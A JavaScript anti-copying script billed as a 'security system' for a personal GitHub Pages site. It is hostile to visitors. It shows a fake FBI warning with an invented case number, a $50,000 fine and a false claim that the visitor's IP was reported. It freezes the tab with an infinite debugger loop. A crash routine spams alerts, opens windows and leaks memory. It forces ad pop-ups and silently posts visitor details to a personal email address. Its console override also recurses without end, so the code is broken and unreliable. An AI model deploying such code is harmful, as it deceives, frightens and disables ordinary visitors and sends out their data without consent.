/*
 * Comprehensive Security System for Web Protection
 * Version 3.1.4
 * Designed specifically for nepsen.github.io
 */

// ====================== CONFIGURATION ======================
const SECURITY_CONFIG = {
    // Allowed domains (case sensitive)
    allowedDomains: ["nepsen.github.io", "www.nepsen.github.io"],
    
    // Security email settings
    alertEmail: "arafatislamlam15@gmail.com",
    emailService: "https://formsubmit.co",
    
    // Ad URLs to redirect to when security is triggered
    adUrls: [
        "https://example.com/ad1",
        "https://example.com/ad2",
        "https://example.com/ad3"
    ],
    
    // Critical file paths to check
    criticalFiles: [
        "/cloudgaminghub/1.js",
        "/ishahi/index.html"
    ],
    
    // Fake FBI page configuration
    fbiWarning: {
        title: "FBI WARNING",
        caseNumber: "FBI-2023-48572-NEPSEN",
        fineAmount: "$50,000",
        message: "You have been caught copying protected code from nepsen.github.io. This is a federal offense under 18 U.S. Code § 1030 - Fraud and related activity in connection with computers.",
        contactInfo: "Please contact the FBI Cyber Division immediately to resolve this matter.",
        logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjMDAyOTVkIiBkPSJNNDQ4IDMySDY0QzI4LjcgMzIgMCA2MC43IDAgOTZ2MzIwYzAgMzUuMyAyOC43IDY0IDY0IDY0aDM4NGMzNS4zIDAgNjQtMjguNyA2NC02NFY5NmMwLTM1LjMtMjguNy02NC02NC02NHoiLz48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTI4IDE0NGMwLTguOCA3LjItMTYgMTYtMTZoOTZjOC44IDAgMTYgNy4yIDE2IDE2djMyYzAgOC44LTcuMiAxNi0xNiAxNmgtOTZjLTguOCAwLTE2LTcuMi0xNi0xNnYtMzJ6bTAgOTZjMC04LjggNy4yLTE2IDE2LTE2aDk2YzguOCAwIDE2IDcuMiAxNiAxNnYzMmMwIDguOC03LjIgMTYtMTYgMTZoLTk2Yy04LjggMC0xNi03LjItMTYtMTZ2LTMyem0xNjAgMTYwYzAtNDQuMi0zNS44LTgwLTgwLTgwcy04MCAzNS44LTgwIDgwYzAgMjYuNCAxMi44IDQ5LjkgMzIuNSA2NC44IDIuOS0yMS42IDIwLjYtMzguNCA0My4xLTM4LjQgMTUuNSAwIDI5LjEgOC44IDM2LjEgMjEuNyA4LjEtMTIuOSAyMS42LTIxLjcgMzYuMS0yMS43IDIyLjUgMCA0MC4yIDE2LjggNDMuMSAzOC40IDE5LjctMTQuOSAzMi41LTM4LjQgMzIuNS02NC44eiIvPjwvc3ZnPg=="
    },
    
    // Browser detection patterns
    browserPatterns: {
        chrome: /Chrome|CriOS/,
        firefox: /Firefox|FxiOS/,
        safari: /Safari/,
        edge: /Edg|Edge/,
        opera: /OPR|Opera/,
        ie: /MSIE|Trident/,
        brave: /Brave/,
        tor: /TorBrowser/,
        vivaldi: /Vivaldi/,
        duckduckgo: /DuckDuckGo/
    },
    
    // Security logging
    logPrefix: "[SECURITY]",
    localStorageKey: "nepsen_security_log"
};

// ====================== SECURITY SYSTEM INITIALIZATION ======================
(function() {
    "use strict";
    
    // Initialize security system
    class SecuritySystem {
        constructor(config) {
            this.config = config;
            this.securityBreached = false;
            this.blockedActions = [];
            this.browser = this.detectBrowser();
            this.initialize();
        }
        
        // Initialize all security measures
        initialize() {
            this.log("Security system initializing...");
            
            // Check domain first
            if (!this.isAllowedDomain()) {
                this.handleUnauthorizedDomain();
                return;
            }
            
            // Setup all security measures
            this.setupEventListeners();
            this.checkCriticalFiles();
            this.setupMutationObserver();
            this.disableDevTools();
            this.blockKeyboardShortcuts();
            
            // Periodic checks
            setInterval(() => this.checkCriticalFiles(), 30000);
            setInterval(() => this.checkTampering(), 60000);
            
            this.log("Security system initialized successfully");
        }
        
        // ====================== CORE SECURITY FUNCTIONS ======================
        
        // Check if current domain is allowed
        isAllowedDomain() {
            const currentDomain = window.location.hostname;
            return this.config.allowedDomains.some(domain => 
                currentDomain === domain || 
                currentDomain.endsWith('.' + domain)
            );
        }
        
        // Handle unauthorized domain access
        handleUnauthorizedDomain() {
            this.securityBreached = true;
            this.log("Unauthorized domain access detected");
            
            // Clear the page
            document.documentElement.innerHTML = `
                <head>
                    <title>Access Denied</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            background-color: #f8f9fa;
                            color: #212529;
                            margin: 0;
                            padding: 20px;
                            text-align: center;
                        }
                        .container {
                            max-width: 600px;
                            margin: 50px auto;
                            padding: 20px;
                            background-color: #fff;
                            border-radius: 8px;
                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        }
                        h1 {
                            color: #dc3545;
                        }
                        .redirect-message {
                            margin-top: 20px;
                            font-size: 16px;
                            color: #6c757d;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>⛔ Access Denied</h1>
                        <p>This website can only be accessed from the authorized domain:</p>
                        <p><strong>${this.config.allowedDomains[0]}</strong></p>
                        <p>Unauthorized access attempts are logged and reported.</p>
                        <div class="redirect-message">
                            <p>Redirecting to secure home page...</p>
                        </div>
                    </div>
                </body>
            `;
            
            // Send security alert
            this.sendSecurityAlert("Unauthorized domain access");
            
            // Redirect after delay
            setTimeout(() => {
                window.location.href = "https://" + this.config.allowedDomains[0];
            }, 5000);
            
            // Show FBI warning
            setTimeout(() => this.showFBIWarning(), 3000);
        }
        
        // ====================== KEYBOARD SHORTCUT BLOCKING ======================
        
        // Block all specified keyboard shortcuts
        blockKeyboardShortcuts() {
            const blockedCombos = [
                { keys: ["Control", "s"], name: "Save Page" },
                { keys: ["Control", "u"], name: "View Source" },
                { keys: ["F12"], name: "Developer Tools" },
                { keys: ["Control", "Shift", "i"], name: "Developer Tools" },
                { keys: ["Control", "Shift", "j"], name: "Console" },
                { keys: ["Control", "Shift", "c"], name: "Inspect Element" },
                { keys: ["Control", "p"], name: "Print" },
                { keys: ["Control", "Shift", "p"], name: "Command Menu" },
                { keys: ["F5"], name: "Refresh" },
                { keys: ["Control", "F5"], name: "Hard Refresh" },
                { keys: ["Alt", "F4"], name: "Close Window" }
            ];
            
            document.addEventListener('keydown', (e) => {
                const pressedKeys = [];
                if (e.ctrlKey) pressedKeys.push("Control");
                if (e.shiftKey) pressedKeys.push("Shift");
                if (e.altKey) pressedKeys.push("Alt");
                if (e.metaKey) pressedKeys.push("Meta");
                
                // Add the main key if not a modifier
                if (!["Control", "Shift", "Alt", "Meta"].includes(e.key)) {
                    pressedKeys.push(e.key);
                }
                
                // Check if this combo is blocked
                blockedCombos.forEach(combo => {
                    if (this.arraysEqual(pressedKeys, combo.keys)) {
                        e.preventDefault();
                        e.stopPropagation();
                        this.log(`Blocked keyboard shortcut: ${combo.name}`);
                        this.handleSecurityViolation(`Attempted use of blocked shortcut: ${combo.name}`);
                        return false;
                    }
                });
                
                // Special case for F12 which doesn't always show up with e.key
                if (e.keyCode === 123) { // F12
                    e.preventDefault();
                    e.stopPropagation();
                    this.log("Blocked F12 Developer Tools shortcut");
                    this.handleSecurityViolation("Attempted use of F12 Developer Tools");
                    return false;
                }
            }, true);
        }
        
        // Helper to compare arrays
        arraysEqual(a, b) {
            if (a.length !== b.length) return false;
            for (let i = 0; i < a.length; i++) {
                if (a[i] !== b[i]) return false;
            }
            return true;
        }
        
        // ====================== DEVELOPER TOOLS DETECTION ======================
        
        // Disable developer tools
        disableDevTools() {
            // Method 1: Override console methods
            this.overrideConsoleMethods();
            
            // Method 2: Detect devtools opening
            let devtoolsOpen = false;
            const threshold = 160;
            
            const checkDevTools = () => {
                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
                const orientation = widthThreshold ? 'vertical' : 'horizontal';
                
                if (!(heightThreshold && widthThreshold) && 
                    ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || 
                     widthThreshold || heightThreshold)) {
                    
                    if (!devtoolsOpen) {
                        devtoolsOpen = true;
                        this.handleSecurityViolation("Developer tools detected");
                        this.showFBIWarning();
                    }
                } else {
                    devtoolsOpen = false;
                }
            };
            
            // Check periodically
            setInterval(checkDevTools, 1000);
            
            // Also check on resize
            window.addEventListener('resize', checkDevTools);
            
            // Method 3: Debugger trap
            const debuggerTrap = () => {
                if (devtoolsOpen) {
                    // Infinite debugger loop
                    while (true) {
                        try {
                            (function() {})['constructor']('debugger')();
                        } catch(e) {
                            // Continue the loop
                        }
                    }
                }
            };
            
            setInterval(debuggerTrap, 1000);
        }
        
        // Override console methods to detect usage
        overrideConsoleMethods() {
            const consoleMethods = ['log', 'warn', 'error', 'info', 'debug', 'table', 'dir', 'trace'];
            
            consoleMethods.forEach(method => {
                const original = console[method];
                
                console[method] = function() {
                    // Log to our security system
                    this.log(`Console.${method} called:`, Array.from(arguments).join(' '));
                    
                    // Handle as security violation
                    this.handleSecurityViolation(`Console.${method} called`);
                    
                    // Optionally: show FBI warning
                    this.showFBIWarning();
                    
                    // Call original if needed
                    if (original) {
                        original.apply(console, arguments);
                    }
                }.bind(this);
            });
        }
        
        // ====================== CRITICAL FILE CHECKING ======================
        
        // Check if critical files exist
        checkCriticalFiles() {
            this.config.criticalFiles.forEach(file => {
                this.checkFileExists(file).then(exists => {
                    if (!exists) {
                        this.handleSecurityViolation(`Critical file missing: ${file}`);
                        this.showFakeError(`File not found: ${file}`);
                        this.logToLocalStorage(`Critical file missing: ${file}`);
                    }
                });
            });
        }
        
        // Check if a file exists
        checkFileExists(url) {
            return new Promise(resolve => {
                const xhr = new XMLHttpRequest();
                xhr.open('HEAD', url, true);
                
                xhr.onreadystatechange = () => {
                    if (xhr.readyState === 4) {
                        resolve(xhr.status !== 404);
                    }
                };
                
                xhr.onerror = () => resolve(false);
                xhr.ontimeout = () => resolve(false);
                
                try {
                    xhr.send();
                } catch(e) {
                    resolve(false);
                }
            });
        }
        
        // ====================== TAMPERING DETECTION ======================
        
        // Check for DOM tampering
        checkTampering() {
            // Check if document.body has been replaced
            if (!document.body || document.body.tagName !== 'BODY') {
                this.handleSecurityViolation("DOM tampering detected - body replaced");
                return;
            }
            
            // Check for script removal
            const scripts = document.getElementsByTagName('script');
            let securityScriptFound = false;
            
            for (let i = 0; i < scripts.length; i++) {
                if (scripts[i].textContent.includes(this.config.logPrefix)) {
                    securityScriptFound = true;
                    break;
                }
            }
            
            if (!securityScriptFound) {
                this.handleSecurityViolation("Security script removed from DOM");
            }
        }
        
        // Monitor DOM changes
        setupMutationObserver() {
            const observer = new MutationObserver(mutations => {
                mutations.forEach(mutation => {
                    if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
                        Array.from(mutation.removedNodes).forEach(node => {
                            if (node.nodeName === 'SCRIPT' && node.textContent.includes(this.config.logPrefix)) {
                                this.handleSecurityViolation("Security script removed from DOM");
                            }
                        });
                    }
                });
            });
            
            observer.observe(document.documentElement, {
                childList: true,
                subtree: true
            });
        }
        
        // ====================== SECURITY VIOLATION HANDLING ======================
        
        // Handle any security violation
        handleSecurityViolation(violation) {
            if (this.securityBreached) return;
            
            this.log(`Security violation: ${violation}`);
            this.blockedActions.push({
                type: violation,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href
            });
            
            // Show ads after a short delay
            setTimeout(() => this.showRandomAd(), 1500);
            
            // Send security alert if online
            if (navigator.onLine) {
                this.sendSecurityAlert(violation);
            } else {
                this.logToLocalStorage(`Offline violation: ${violation}`);
                window.addEventListener('online', () => {
                    this.sendSecurityAlert(`[Offline Violation] ${violation}`);
                });
            }
            
            // Show FBI warning for serious violations
            if (violation.includes('Developer tools') || 
                violation.includes('Console') || 
                violation.includes('DOM tampering')) {
                this.showFBIWarning();
            }
        }
        
        // ====================== FAKE ERROR MESSAGES ======================
        
        // Show browser-specific fake error message
        showFakeError(message) {
            let errorHtml = '';
            const browser = this.browser;
            
            // Chrome-like error
            if (browser === 'chrome' || browser === 'edge' || browser === 'opera') {
                errorHtml = `
                    <div style="font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; 
                                background: linear-gradient(#f1f3f4, #e8eaed); 
                                padding: 20px; 
                                border-radius: 8px; 
                                box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
                                max-width: 600px; 
                                margin: 50px auto; 
                                text-align: center;">
                        <div style="font-size: 72px; color: #5f6368;">🛑</div>
                        <h1 style="color: #202124; font-size: 24px; margin-bottom: 16px;">This site can't be reached</h1>
                        <p style="color: #5f6368; font-size: 16px; margin-bottom: 24px;">
                            ${message}<br>
                            Check the file name and try again.
                        </p>
                        <div style="margin-top: 24px;">
                            <button style="background-color: #1a73e8; color: white; border: none; border-radius: 4px; 
                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
                                Reload
                            </button>
                        </div>
                    </div>
                `;
            }
            // Firefox-like error
            else if (browser === 'firefox') {
                errorHtml = `
                    <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                                background-color: #f9f9fa; 
                                padding: 20px; 
                                border-radius: 8px; 
                                max-width: 600px; 
                                margin: 50px auto; 
                                text-align: center;">
                        <div style="font-size: 72px; color: #20123a;">⚠️</div>
                        <h1 style="color: #20123a; font-size: 24px; margin-bottom: 16px;">Unable to load page</h1>
                        <p style="color: #20123a; font-size: 16px; margin-bottom: 24px;">
                            ${message}<br>
                            Please check the address and try again.
                        </p>
                        <div style="margin-top: 24px;">
                            <button style="background-color: #0060df; color: white; border: none; border-radius: 4px; 
                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
                                Try Again
                            </button>
                        </div>
                    </div>
                `;
            }
            // Safari-like error
            else if (browser === 'safari') {
                errorHtml = `
                    <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                                background-color: #f5f5f7; 
                                padding: 20px; 
                                max-width: 600px; 
                                margin: 50px auto; 
                                text-align: center;">
                        <div style="font-size: 72px; color: #86868b;">❌</div>
                        <h1 style="color: #1d1d1f; font-size: 24px; margin-bottom: 16px;">Safari can't open the page</h1>
                        <p style="color: #86868b; font-size: 16px; margin-bottom: 24px;">
                            ${message}<br>
                            The error is: "File not found"
                        </p>
                        <div style="margin-top: 24px;">
                            <button style="background-color: #0071e3; color: white; border: none; border-radius: 18px; 
                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
                                Reload Page
                            </button>
                        </div>
                    </div>
                `;
            }
            // Tor browser-like error
            else if (browser === 'tor') {
                errorHtml = `
                    <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                                background-color: #f8f8f8; 
                                padding: 20px; 
                                max-width: 600px; 
                                margin: 50px auto; 
                                text-align: center;">
                        <div style="font-size: 72px; color: #7d4698;">⚠️</div>
                        <h1 style="color: #222; font-size: 24px; margin-bottom: 16px;">Tor Browser can't find the file</h1>
                        <p style="color: #555; font-size: 16px; margin-bottom: 24px;">
                            ${message}<br>
                            This might be a security issue.
                        </p>
                        <div style="margin-top: 24px;">
                            <button style="background-color: #7d4698; color: white; border: none; border-radius: 4px; 
                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
                                New Identity
                            </button>
                        </div>
                    </div>
                `;
            }
            // Default error (generic browser)
            else {
                errorHtml = `
                    <div style="font-family: Arial, sans-serif; 
                                background-color: #f5f5f5; 
                                padding: 20px; 
                                border-radius: 8px; 
                                max-width: 600px; 
                                margin: 50px auto; 
                                text-align: center;">
                        <div style="font-size: 72px; color: #666;">⚠️</div>
                        <h1 style="color: #333; font-size: 24px; margin-bottom: 16px;">Error loading page</h1>
                        <p style="color: #666; font-size: 16px; margin-bottom: 24px;">
                            ${message}<br>
                            Please check the file path and try again.
                        </p>
                        <div style="margin-top: 24px;">
                            <button style="background-color: #0066cc; color: white; border: none; border-radius: 4px; 
                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
                                Retry
                            </button>
                        </div>
                    </div>
                `;
            }
            
            // Create overlay
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
            overlay.style.zIndex = '9999';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.innerHTML = errorHtml;
            
            document.body.appendChild(overlay);
            
            // Add click handler to button
            const button = overlay.querySelector('button');
            if (button) {
                button.addEventListener('click', () => {
                    document.body.removeChild(overlay);
                });
            }
        }
        
        // ====================== FBI WARNING PAGE ======================
        
        // Show fake FBI warning page
        showFBIWarning() {
            if (document.getElementById('fbi-warning-overlay')) return;
            
            const fbiConfig = this.config.fbiWarning;
            
            const overlay = document.createElement('div');
            overlay.id = 'fbi-warning-overlay';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = '#0a0a2a';
            overlay.style.color = 'white';
            overlay.style.zIndex = '10000';
            overlay.style.fontFamily = "'Arial', sans-serif";
            overlay.style.overflow = 'auto';
            overlay.style.padding = '20px';
            overlay.style.boxSizing = 'border-box';
            
            overlay.innerHTML = `
                <div style="max-width: 800px; margin: 0 auto; border: 2px solid red; padding: 20px; background-color: #000033;">
                    <div style="display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid red; padding-bottom: 10px;">
                        <img src="${fbiConfig.logo}" alt="FBI Logo" style="height: 80px; margin-right: 20px;">
                        <div>
                            <h1 style="color: red; margin: 0; font-size: 32px;">${fbiConfig.title}</h1>
                            <p style="margin: 5px 0 0; font-size: 16px;">Case #${fbiConfig.caseNumber}</p>
                        </div>
                    </div>
                    
                    <div style="margin: 30px 0; text-align: center;">
                        <p style="font-size: 24px; color: #ffcc00;">WARNING: UNAUTHORIZED ACCESS DETECTED</p>
                        <p style="font-size: 18px;">${fbiConfig.message}</p>
                    </div>
                    
                    <div style="background-color: #000044; padding: 15px; border: 1px solid #4444ff; margin-bottom: 20px;">
                        <p style="font-size: 20px; text-align: center; color: white;">
                            <strong>FINE IMPOSED: ${fbiConfig.fineAmount}</strong>
                        </p>
                    </div>
                    
                    <div style="margin-bottom: 30px;">
                        <p style="font-size: 16px; line-height: 1.5;">
                            Your IP address, location, and device information have been recorded and reported to federal authorities.
                            Continuing to attempt unauthorized access to this protected system may result in additional penalties,
                            including criminal charges under the Computer Fraud and Abuse Act.
                        </p>
                        <p style="font-size: 16px; margin-top: 15px;">
                            ${fbiConfig.contactInfo}
                        </p>
                    </div>
                    
                    <div style="text-align: center; margin-top: 30px;">
                        <button id="fbi-close-btn" style="background-color: red; color: white; border: none; 
                                    padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 4px;">
                            I Understand - Close This Warning
                        </button>
                    </div>
                </div>
            `;
            
            document.body.appendChild(overlay);
            
            // Add close button handler
            const closeBtn = document.getElementById('fbi-close-btn');
            if (closeBtn) {
                closeBtn.addEventListener('click', () => {
                    document.body.removeChild(overlay);
                    this.showRandomAd();
                });
            }
            
            // Also show ads
            this.showRandomAd();
        }
        
        // ====================== AD REDIRECTION ======================
        
        // Show random ad from the list
        showRandomAd() {
            if (this.config.adUrls.length === 0) return;
            
            const randomAd = this.config.adUrls[
                Math.floor(Math.random() * this.config.adUrls.length)
            ];
            
            this.log(`Showing ad: ${randomAd}`);
            
            // Open in new tab
            try {
                window.open(randomAd, '_blank');
            } catch(e) {
                this.log(`Failed to open ad: ${e.message}`);
            }
        }
        
        // ====================== EMAIL ALERTS ======================
        
        // Send security alert email
        sendSecurityAlert(violation) {
            if (this.sentEmails && this.sentEmails.includes(violation)) return;
            
            this.log(`Sending security alert: ${violation}`);
            
            // Create a hidden form
            const form = document.createElement('form');
            form.style.display = 'none';
            form.method = 'POST';
            form.action = `${this.config.emailService}/el/${encodeURIComponent(this.config.alertEmail)}`;
            form.setAttribute('target', '_blank');
            
            // Add hidden inputs
            const inputs = {
                '_subject': `🚨 Security Alert: ${violation}`,
                'timestamp': new Date().toISOString(),
                'location': window.location.href,
                'userAgent': navigator.userAgent,
                'ip': 'Unknown (client-side)', // Will be filled by FormSubmit
                'details': JSON.stringify({
                    blockedActions: this.blockedActions,
                    violation: violation,
                    referrer: document.referrer,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    browser: this.browser
                }, null, 2)
            };
            
            for (let key in inputs) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = inputs[key];
                form.appendChild(input);
            }
            
            // FormSubmit required inputs
            const honeypot = document.createElement('input');
            honeypot.type = 'hidden';
            honeypot.name = '_captcha';
            honeypot.value = 'false';
            form.appendChild(honeypot);
            
            const template = document.createElement('input');
            template.type = 'hidden';
            template.name = '_template';
            template.value = 'table';
            form.appendChild(template);
            
            document.body.appendChild(form);
            
            try {
                form.submit();
                this.log("Security alert email sent");
                
                // Remember we sent this alert
                if (!this.sentEmails) this.sentEmails = [];
                this.sentEmails.push(violation);
                
                // Store in localStorage
                this.logToLocalStorage(`Email sent: ${violation}`);
            } catch(e) {
                this.log(`Failed to send email: ${e.message}`);
                this.logToLocalStorage(`Failed to send email: ${violation}`);
            } finally {
                setTimeout(() => {
                    if (form.parentNode) {
                        document.body.removeChild(form);
                    }
                }, 5000);
            }
        }
        
        // ====================== SYSTEM CRASHING ======================
        
        // Attempt to crash or lag the system
        crashSystem() {
            this.log("Attempting to crash/lag system...");
            
            // Method 1: Infinite console logging
            const consoleSpam = () => {
                const messages = [
                    "SECURITY VIOLATION DETECTED",
                    "UNAUTHORIZED ACCESS ATTEMPT",
                    "FEDERAL CRIME IN PROGRESS",
                    "SYSTEM COMPROMISE DETECTED",
                    "ILLEGAL CODE COPYING DETECTED",
                    "FBI NOTIFICATION SENT",
                    "YOUR LOCATION HAS BEEN LOGGED",
                    "TERMINATING SYSTEM PROCESSES"
                ];
                
                let count = 0;
                const spamInterval = setInterval(() => {
                    if (count++ > 1000) clearInterval(spamInterval);
                    
                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
                    console.error(`%c${randomMsg}`, 'color: red; font-size: 20px; font-weight: bold;');
                    
                    // Alternate methods
                    if (count % 10 === 0) {
                        try {
                            console.clear();
                        } catch(e) {}
                    }
                    
                    if (count % 20 === 0) {
                        try {
                            window.open('about:blank', '_blank');
                        } catch(e) {}
                    }
                }, 50);
            };
            
            // Method 2: Memory leak
            const memoryLeak = [];
            const leakInterval = setInterval(() => {
                memoryLeak.push(new Array(1000000).fill(Math.random()));
            }, 1000);
            
            // Method 3: Infinite alerts (if not blocked)
            const alertSpam = () => {
                let alertCount = 0;
                const tryAlert = () => {
                    if (alertCount++ > 20) return;
                    try {
                        alert("SECURITY VIOLATION DETECTED!\n\nYour actions have been reported to authorities.");
                    } catch(e) {
                        // Alerts blocked, continue with other methods
                    }
                    setTimeout(tryAlert, 1000);
                };
                tryAlert();
            };
            
            // Start all methods
            consoleSpam();
            alertSpam();
            
            // Cleanup after a while
            setTimeout(() => {
                clearInterval(leakInterval);
            }, 30000);
        }
        
        // ====================== UTILITY FUNCTIONS ======================
        
        // Detect browser
        detectBrowser() {
            const userAgent = navigator.userAgent;
            
            for (let browser in this.config.browserPatterns) {
                if (this.config.browserPatterns[browser].test(userAgent)) {
                    return browser;
                }
            }
            
            return 'unknown';
        }
        
        // Log messages
        log(message, ...args) {
            console.log(`${this.config.logPrefix} ${message}`, ...args);
        }
        
        // Log to localStorage
        logToLocalStorage(message) {
            try {
                let logs = JSON.parse(localStorage.getItem(this.config.localStorageKey)) || [];
                logs.push({
                    timestamp: new Date().toISOString(),
                    message: message
                });
                
                // Keep only the last 100 logs
                if (logs.length > 100) {
                    logs = logs.slice(logs.length - 100);
                }
                
                localStorage.setItem(this.config.localStorageKey, JSON.stringify(logs));
            } catch(e) {
                this.log("Failed to write to localStorage:", e.message);
            }
        }
        
        // Setup event listeners
        setupEventListeners() {
            // Context menu prevention
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Right-click context menu attempt");
            });
            
            // Drag and drop prevention
            document.addEventListener('dragstart', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Drag attempt");
            });
            
            // Selection prevention
            document.addEventListener('selectstart', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Text selection attempt");
            });
            
            // Copy prevention
            document.addEventListener('copy', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Copy attempt");
            });
            
            // Cut prevention
            document.addEventListener('cut', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Cut attempt");
            });
            
            // Paste prevention
            document.addEventListener('paste', (e) => {
                e.preventDefault();
                this.handleSecurityViolation("Paste attempt");
            });
            
            // Offline/online detection
            window.addEventListener('offline', () => {
                this.log("Browser went offline");
                this.logToLocalStorage("Browser offline");
            });
            
            window.addEventListener('online', () => {
                this.log("Browser came online");
                
                // Check if we have pending offline violations
                const logs = JSON.parse(localStorage.getItem(this.config.localStorageKey)) || [];
                const offlineViolations = logs.filter(log => 
                    log.message.includes("Offline violation"));
                
                if (offlineViolations.length > 0) {
                    this.sendSecurityAlert(`${offlineViolations.length} offline violations occurred`);
                }
            });
        }
    }
    
    // Initialize the security system
    const securitySystem = new SecuritySystem(SECURITY_CONFIG);
    
    // Make it accessible for debugging (but protected)
    Object.defineProperty(window, '$$securitySystem', {
        get: () => {
            securitySystem.handleSecurityViolation("Attempted access to security system object");
            securitySystem.showFBIWarning();
            return undefined;
        },
        configurable: false,
        enumerable: false
    });
})();
